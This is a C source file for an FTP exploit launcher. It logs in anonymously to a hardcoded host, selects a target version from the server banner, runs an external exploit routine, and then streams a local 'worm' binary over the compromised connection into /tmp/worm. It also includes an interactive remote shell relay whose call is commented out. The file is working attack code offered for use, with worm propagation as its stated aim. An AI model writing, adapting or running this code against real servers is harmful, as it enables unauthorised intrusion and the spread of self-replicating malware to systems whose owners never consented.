#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "exploit.h"

#define CMD "cat - >/tmp/worm\n"

int main(int argc, char *argv[]) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;
    unsigned int mlen = 0;
    unsigned char mcode[256];
    char *hostname = "10.2.0.100";
    char *username = "ftp";
    char *password = "mozilla@";

    unsigned char buffer[256];
    FILE *ptr;
    FILE *fd_bin;
    int size;

    printf("# trying to log into %s with (%s/%s) ...", hostname, username, password);
    fd = ftp_login(hostname, username, password, &banner);
    if (fd <= 0) {
        fprintf(stderr, "\nfailed to connect (user/pass correct?)\n");
        return -1;
    }
    printf(" connected.\n");

    printf("# banner: %s", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            printf ("# failed to jield target from banner, aborting\n");
            return -1;
        }
        printf ("# successfully selected target from banner\n");
    }
    printf ("\n### TARGET: %s\n\n", target->desc);

    // run the exploit
    ret = exploit (fd, target);
    if (ret != 0) {
        exit(EXIT_FAILURE);
    }

    write(fd, "cat >/tmp/worm << EOF\n", strlen("cat >/tmp/worm << EOF\n"));

    ptr = fopen("./worm", "rb");
    while ((size = fread(buffer, 1, sizeof(buffer), ptr)) > 0) {
        printf("size %d\n", size);
        write(fd, buffer, size);
    }

    write(fd, "\n", strlen("\n"));
    write(fd, "EOF\n", strlen("EOF\n"));
    write(fd, "\n", strlen("\n"));

    // open a shell
    /*ret = shell(fd);
    if (ret != 0) {
        exit(EXIT_FAILURE);
    }*/

    exit(EXIT_SUCCESS);
}


int shell (int sock) {
    int l;
    char buf[512];
    fd_set  rfds;

    while (1) {
        FD_SET(0, &rfds);
        FD_SET(sock, &rfds);

        select(sock + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET(0, &rfds)) {
            l = read(0, buf, sizeof (buf));
            if (l <= 0) {
                perror("read user");
                return -1;
            }
            write (sock, buf, l);
        }

        if (FD_ISSET(sock, &rfds)) {
            l = read(sock, buf, sizeof (buf));
            if (l == 0) {
                printf("connection closed by foreign host.\n");
                return -1;
            } else if (l < 0) {
                perror("read remote");
                return -1;
            }
            write (1, buf, l);
        }
    }

    return 0;
}
